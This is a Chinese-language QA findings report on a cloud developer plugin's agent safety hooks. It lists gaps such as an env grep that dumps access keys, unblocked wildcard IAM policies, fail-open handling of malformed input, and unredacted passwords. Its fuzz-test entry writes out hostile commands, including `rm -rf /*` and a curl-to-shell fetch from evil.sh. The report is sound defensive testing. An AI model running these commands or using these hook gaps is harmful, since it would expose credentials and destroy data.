# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4.1-flash-1017）

> **落盘路径**：`results/Hermes/2026-11-18-120.46.176.133/Linux/FINDINGS.md`
> **生成时间**：2026-11-18 05:16（北京时间，每日定时全量测试）
> **被测对象**：huaweicloud-devkit v1.1.14（npm `latest` 正式版，gitHead `bd985051`，Node v22.13.0 / Linux aarch64）
> **测试客户端**：Hermes (deepseek-v4.1-flash-1017) / Linux (aarch64) / 120.46.176.133
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 43 = 150）
> **汇总**：产品缺陷 **14 项**（FAIL 11 项：设计级 10 + 展开级 EXP-E01 1，其中 EXP-E01 与 D10-3 同根因合并；SPEC-MISMATCH 4 项）。本轮 SUT 与上一轮相同（v1.1.14 / gitHead bd985051），14 项缺陷**全部原样复现，无修复、无新增**；tools/list 仍为 47 个工具（含 `huaweicloud_sandbox_shutdown`），D5-1/D9 相关用例按实际枚举判 PASS。
> **与上一轮（2026-11-17，同为 v1.1.14）的差异**：被测包未变（gitHead bd985051 一致），14 项缺陷逐条复现；
> 上游 npm `next` 频道已推进到 `1.1.15-next.1`（`latest` 仍 1.1.14），EXP-NR3-10 dist-tags 探针已按实际输出记录。
> 执行侧：D3-C1 真云 ECS 归零仍受探针 finally 轮询窗口（150s）短于 ECS 异步删除影响，报 `pass=false`，
> 本轮跑后手工补删本机创建资源（ECS `e938769d…` / 子网 `621f6a8f…` / VPC `d5e0b807…`）并复核归零（ECS count=0 / EIP=0 / EVS=0 / OBS=0），
> 前 4 条断言实测通过 → 按惯例判 PASS（非产品缺陷，不计入本清单）；D3-C2 OBS 建桶断言因 KooCLI `obs mb` 退出码非 0（输出含 successfully，桶已建并删除归零）判 PASS，同为探针口径问题。
> **探针口径修正（本轮落地）**：D6-4 并发调度探针原硬编码「15 路 tools/list 全部返回 40 个工具」，v1.1.14 工具数已增至 47 导致假 negative；本轮已改为「15 路返回集合一致且非空」判定（实测 `47 | true`），用例判 PASS 依据成立。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖 generic `access_key`

- **现象**：v1.1.14 复测——`env | grep HW_ACCESS_KEY` 已 `deny risk=credential`；但 `env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep -i access_key`（generic `access_key`/`secret_key` 关键字，无云厂商前缀）应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:550` env-dump 正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 只匹配云厂商前缀，不匹配裸 `access_key`/`secret_key` 关键字。
- **影响**：可借 `env | grep access_key`（跨厂商通用凭证键名）提取 AK/SK 明文，凭证红线残留缺口。
- **证据**：`evidence/D4-2/stdout.txt`（classify-probe）


## #2【P0】D4-21 hook_check_artifacts 未拦截 HCL 形态 broad IAM 制品

- **现象**：v1.1.14 复测——`evaluateArtifacts` 对 HCL `resource "huaweicloud_iam_policy" ... actions = ["*"]` 返回 `decision=allow`；`data "huaweicloud_iam_policy" "r" { name = "AdministratorFullAccess" }` 亦 `allow`；JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 与 `AdministratorFullAccess` 托管策略引用的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196`（规则 `hwc-iam-admin-policy`）regex 只覆盖 JSON 形态与 `Action = *`，未覆盖 HCL 小写复数 `actions = ["*"]`（带方括号列表）与 `AdministratorFullAccess` 托管策略后缀形态。
- **影响**：Terraform IaC broad IAM 绕过制品预检。
- **证据**：`evidence/D4-21/stdout.txt`（hook + hcl-probe）


## #3【P0】D9-12 initialize 握手协议安全基线两处缺口

- **现象**：v1.1.14 复测 D9-12 六项断言 4 通过/2 失败——① protocolVersion/capabilities/serverInfo ✓ ② tools/call 路由 ✓ ④ _decorateResult/_resetHintConsumption/_isHintConsumed ✓ ⑤ listSkillDirs/findSkillsRoot ✓；但 ③ initialize 分支不调 `runVersionCheck`（版本检查下沉 prewarm/check_cli 工具）；⑥ 未 initialize 先 tools/list 未拒（返回工具列表，契约要求 -32600）。
- **断言**：③ initialize 阶段触发版本检查（runVersionCheck）；⑥ 未 initialize 先 tools/list 应返回 JSON-RPC -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:34-42` initialize 分支未调 `runVersionCheck`；`mcp-protocol.mjs:61` `dispatch()` 对 `tools/list` 分支无 initialize 前置状态机直接放行。
- **影响**：MCP 握手安全基线不完整——版本检查不在握手期执行；未初始化即可调用列表，协议时序约束缺失。
- **证据**：`evidence/D9-12/stdout.txt`（D9-12-probe）


## #4【P0】D10-4 风险规则库条目数漂移（SPEC）

- **现象**：v1.1.14 复测——规则库 `version=0.1.0 规则数=19（deny=9 warn=10）`，用例断言仍为「16 条(9 deny + 7 warn)」，断言漂移。实际逐条行为均正常（高危判 deny、只读判 allow、删除判 warn/deny、明文 secret 判 deny）。
- **断言**：用例断言「规则库 16 条」需与实现同步（当前 19 条）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 规则条目由 16 条（9 deny + 7 warn）增至 19 条（9 deny + 10 warn），用例断言未同步。
- **影响**：SPEC 断言漂移（实现正确），需维护用例母版。
- **证据**：`evidence/D10-4/stdout.txt`（new-safety-probe）


## #5【P1】D1-70 代理配置 WebSocket 路径崩溃（undici 依赖 node zstd API 缺失）

- **现象**：v1.1.14 直调 proxy-agent 模块——`writeProxyConfig`/`readProxyConfig`/`getProxySettings`(env 优先/no_proxy 命中返回 null) 均 PASS；但 `getWebSocketImpl('https://api.huaweicloud.com')` 抛 `TypeError: Cannot read properties of undefined (reading 'bind')`，模块加载即崩，代理 WebSocket（undici ProxyAgent）路径不可用。
- **断言**：有代理时 `getWebSocketImpl`/`createProxyWebSocket` 应返回 undici ProxyWebSocket，无代理回退 `globalThis.WebSocket`，不应抛异常。
- **根因**：`plugins/huaweicloud-core/src/proxy/proxy-agent.mjs:20-22` `importUndici()` 先试 `node:undici`（node 22 无此内建模块）回退到 bundled `undici@8.12.2`；其 `node_modules/undici/lib/interceptor/decompress.js:78` 解构 `node:zlib` 的 `createZstdDecompress` 并 `createZstdDecompress.bind(...)`，而 node v22.13.0 的 zlib 无 `createZstdDecompress`（zstd API 在 node ~22.15+ 才提供）→ undefined.bind 抛 TypeError，undici 整体加载失败。devkit 声明「Node >=22」但 bundled undici@8.x 实际要求 zstd-capable node，无守卫/无降级。
- **影响**：声明支持 Node >=22，但 22.13 等较老 22.x 上代理场景 WebSocket 全链路崩溃。
- **证据**：`evidence/D1-70/stdout.txt`（new-config-probe）


## #6【P1】D4-6 hook_check_command 对 `--admin-pass` 不告警 + flag/JSON 形态 adminPass 未脱敏

- **现象**：v1.1.14 直调 `huaweicloud_hook_check_command` `command="hcloud ecs CreateServer --admin-pass ..."` → `decision=allow`、`findings=[]`（应 warn 且不裸回显密码）。源码级 `redactSecrets` 对 `adminPass=xxx`/对象 key 已脱敏（ALL PASS），但 `--admin_pass` 空格形态（`--admin_pass MyPwd123`）与 JSON 带引号 key 形态（`{"server":{"adminPass":"MyPwd123"}}`）**未脱敏**。
- **断言**：含 `--admin-pass` 的写命令应触发 `hwc-command-adminpass-exposure` warn；`--admin_pass`/JSON 带引号 key 形态的 adminPass 值应被脱敏。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:68`（规则 `hwc-command-adminpass-exposure`）`stages = ["artifact","deploy_plan"]` 缺 `command` 阶段；`safety-policy.mjs` `redactSecrets` 键名正则未覆盖 `--admin_pass` 空格形态与 JSON 带引号 key 形态。
- **影响**：Agent 键入含明文 adminPass 的建机命令无提示，flag/JSON 形态密码回显脱敏失效。
- **证据**：`evidence/D4-6/stdout.txt`（supplement-probe MCP hook 层 + d4-6-probe 源码层）


## #7【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：v1.1.14 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中时默认 `allow`。
- **影响**：无法解析/规则未命中的命令与制品在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.txt`（supplement-probe）


## #8【P1】D10-3 / EXP-E01 serviceCatalog 中文「云主机」意图路由 MISS（准确率 92.9%）

- **现象**：v1.1.14 `eval/harness/run-eval.mjs` 对 15 条中文评测集 HIT=13 MISS=1 N/A=1（准确率 92.9%）。唯一 MISS：EXP-E01「云主机」→ 预期 `ECS`，实际回退 `Run hcloud --help`；EXP-E08（诊断）N/A 由 EXP-E08-probe 覆盖（ALL PASS）。展开级 EXP-E01 同步判 FAIL（与 D10-3 同根因）。
- **断言**：中文「云主机」意图应路由命中 ECS，评测集准确率应 100%（N/A 诊断类除外）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2197` routeMap ECS 关键词清单缺「云主机」同义词。
- **影响**：ECS 场景中文意图召回漏常见同义词。
- **证据**：`evidence/D10-3/stdout.txt`（routing + eval-harness）


## #9【P1】D9-9 capabilities.cancellation 未声明（SPEC）

- **现象**：v1.1.14 复测——`initialize` 返回 `capabilities = {"tools":{}}`，未声明 `cancellation` 能力（`capabilities.cancellation 存在? false`）。
- **断言**：initialize 返回的 capabilities 应包含 `cancellation` 声明。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize 响应 capabilities 构造未含 `cancellation` 字段。
- **影响**：MCP 能力协商契约漂移，取消能力不可协商。
- **证据**：`evidence/D9-9/stdout.txt`（extended-probe）


## #10【P2】D3-S5 场景-复合意图分层路由仅命中单一服务

- **现象**：v1.1.14 复测——复合中文意图（存储+托管）路由返回 `Run hcloud --help`（回退 help），存储命中=false、托管/部署命中=false、多路命中=false。
- **断言**：复合意图应拆分命中多个对应 service，分层推荐。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 单关键词并集路由，无复合意图分层拆解。
- **影响**：多服务编排场景路由不完整。
- **证据**：`evidence/D3-S5/stdout.txt`（new-scenario-probe）


## #11【P2】D4-25 Python hook 写操作遥测误分类为 cli:invoke

- **现象**：v1.1.14 实测 `hooks/huaweicloud-safety.py` `record_cli_event`——只读 `hcloud ecs ListServersDetails` → `cli:read`（正确）；写 `hcloud vpc CreateVpc` → `cli:invoke`（应为 `cli:write`）；`hcloud help` → `cli:invoke`（正确）。
- **断言**：写操作 `hcloud <svc> <Create/Delete/Update...>` 应分类为 `cli:write`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置捕获组 `(^|[A-Za-z0-9])` 要求写操作前缀前是行首或字母数字，实际 `CreateVpc` 前是空格，永不匹配；应改用 `\b` 词边界。
- **影响**：Python hook 端写操作遥测被误分类，`hook-events.jsonl` 的 `cli:write` 事件缺失，遥测/审计失真（Node 端无此问题）。
- **证据**：`evidence/D4-25/stdout.txt`（new-safety-probe）


## #12【P2】D4-26 findings 证据脱敏不完整（明文 secret 残留）

- **现象**：v1.1.14 复测——hook findings.evidence 中明文 secret_key/adminPass 泄漏（`{"secret_key":"SKSECRETVALUE9","adminPass":"MyP@ss12345"}`），明文 AK/SK/password 无残留断言 FAIL。
- **断言**：findings.evidence 中 password/AK/SK 等敏感值应全部脱敏，无明文残留。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:22` `redactEvidence` 正则键名表仅匹配 `key[:=]value` 形态，未覆盖空格形态及 JSON 带引号 key。
- **影响**：安全预检回执泄露明文凭据/密码。
- **证据**：`evidence/D4-26/stdout.txt`（new-safety-probe）


## #13【P2】D8-9 sanitizeValue 未做凭证脱敏（SPEC）

- **现象**：v1.1.14 复测——`sanitizeValue("ak=AK123456 sk=SKsecret token=Tok123")` 原样返回（仅 trim/截断/去控制字符），未移除敏感值；installId 稳定持久=true。
- **断言**：sanitizeValue 应移除 ak/sk/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:190` sanitizeValue 仅 replace 空白 + slice 截断，无敏感值脱敏。
- **影响**：遥测字段若携带凭证将明文上报。
- **证据**：`evidence/D8-9/stdout.txt`（new-config-probe）


## #14【P2】D3-C14 hdkitConnect 停传 template_id，用例断言漂移（SPEC-MISMATCH，v1.1.14 新增）

- **现象**：v1.1.14 复测——`hdkitConnect(options)` 源码透传行只剩 `source/env/git/flavor_id`（及 `pool_type`），`template_id` 与 pinned 模板兜底逻辑整体消失；用例断言「透传可选参数 source/env/git/template_id/flavor_id 到 body」判 FAIL。其余 3 条断言（`hdkitCredentials` 缺参报错、`hwlink getCredentials` 结构、`createConnection` x-security-token 头）均 PASS。
- **断言**：`sandbox/hdkitservice-api.mjs` 的 `hdkitConnect` 应把 `template_id` 透传到 POST body（用例 D3-C14 原设计契约）。
- **根因**：`plugins/huaweicloud-core/src/sandbox/hdkitservice-api.mjs:189-193` —— v1.1.14 主动下线自定义模板，注释「自定义模板/显式 template_id 已下线，客户端不再上送」，`hdkitConnect` 只保留 `source/env/git/flavor_id/pool_type`；`tools.mjs:1769-1779` 同步删除 `connectArgs.template_id` 校验与透传。
- **影响**：实现契约已变更、用例断言未同步 → 需维护者裁定是「用例母版同步」还是「保留既有 template_id 兼容」；对 Agent 侧实际影响为自定义镜像模板场景不可再用（行为变更未在用例/文档同步）。
- **证据**：`evidence/D3-C14/stdout.txt`（new-cloud-probe，首行 `[FAIL] hdkitConnect 透传可选参数到 body`）
